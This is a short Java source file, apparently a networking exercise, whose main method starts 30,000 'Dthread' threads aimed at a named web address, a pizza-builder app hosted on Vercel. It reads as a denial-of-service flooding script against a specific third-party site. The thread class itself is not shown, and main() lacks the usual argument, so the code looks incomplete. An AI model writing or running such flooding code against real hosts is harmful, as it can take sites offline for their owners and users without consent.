package com.javabyvishalsir.Networking;

public class Main {
    public static void main() throws Exception {
        String host = "https://pizza-builder-tau.vercel.app/";

        for(int i = 0 ; i < 30000 ; i++){
            new Dthread(host).start();
        }

    }
}
